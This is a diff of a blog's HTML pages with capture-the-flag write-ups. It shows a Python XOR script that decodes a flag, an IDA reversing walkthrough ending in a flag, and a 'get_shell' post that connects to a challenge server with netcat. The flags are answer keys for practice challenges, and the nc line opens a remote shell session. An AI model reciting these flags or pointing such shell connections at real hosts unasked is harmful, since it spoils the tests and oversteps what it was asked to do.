v3.append(ord(i))</span><br><span class="line"># print(v3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># for i in range(111):</span><br><span class="line">#   # print(ord(i))</span><br><span class="line">#   v3.append(1)</span><br><span class="line">v3.append(127)</span><br><span class="line">v3.append(119)</span><br><span class="line">v3.append(96)</span><br><span class="line">v3.append(48)</span><br><span class="line">v3.append(107)</span><br><span class="line">v3.append(71)</span><br><span class="line">v3.append(92)</span><br><span class="line">v3.append(29)</span><br><span class="line">v3.append(81)</span><br><span class="line">v3.append(107)</span><br><span class="line">v3.append(90)</span><br><span class="line">v3.append(85)</span><br><span class="line">v3.append(64)</span><br><span class="line">v3.append(12)</span><br><span class="line">v3.append(43)</span><br><span class="line">v3.append(76)</span><br><span class="line">v3.append(86)</span><br><span class="line">v3.append(13)</span><br><span class="line">v3.append(114)</span><br><span class="line">v3.append(1)</span><br><span class="line"></span><br><span class="line"># print(len(v3))</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">temp = &quot;u~&quot;</span><br><span class="line">for i in temp:</span><br><span class="line">  # print(ord(i))</span><br><span class="line">  v3.append(ord(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(56):    #56</span><br><span class="line">  v3[i] ^= v6[i]</span><br><span class="line">  v3[i] ^= 0x13</span><br><span class="line">for i in range(len(v3)):</span><br><span class="line">  print(chr(v3[i]),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9z6sd93j30qr09bgoh.jpg" alt="image.png"></p>
-<p>zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
+      <a href="/2019/05/26/get_shell/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
   </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-4_re1"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-     
-    <div class="article-meta">
-      <a href="/2021/11/15/4_re1/" class="article-date">
-  <time datetime="2021-11-15T09:38:44.379Z" itemprop="datePublished">2021-11-15</time>
-</a>    
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="4-re1"><a href="#4-re1" class="headerlink" title="4_re1"></a>4_re1</h1><p>丢 ida  F5</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa6znito3j30km0bcgpq.jpg" alt="image.png"></p>
-<p>根据逻辑分析</p>
-<p>​    比较v5 v7</p>
-<p>如果 v5 大于v7 输出 正数</p>
-<p>如果 v5 小于 v7 输出 负数</p>
-<p>v5 v7 相等 输出 0</p>
-<p>所以判断flag是在aFlagGet</p>
-<p>进入后</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9q4iaoyj30z30lak6i.jpg" alt="image.png"></p>
-<p>然后在  </p>
-<p>aFlagGet 上 jump hex window</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9r6fwe5j30ja08on64.jpg" alt="image.png"></p>
-<p>DUTCTF{We1c0met0DUTCTF}</p>
+  <p>在kali里面输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 111.200.241.244 49361</span><br></pre></td></tr></table></figure>
+
+<p>直接连接</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gw9t7ixuccj30dp0a0dgw.jpg" alt="a.png"></p>
  
       <!-- reward -->
       
@@ -686,7 +748,7 @@ if not b3.match(&#39;.*404 Not Found&#39;, b3.text):
     <ul>
       <li>
         Copyrights &copy;
-        2015-2021
+        2015-2022
         <i class="ri-heart-fill heart_icon"></i> Jw5t
       </li>
     </ul>
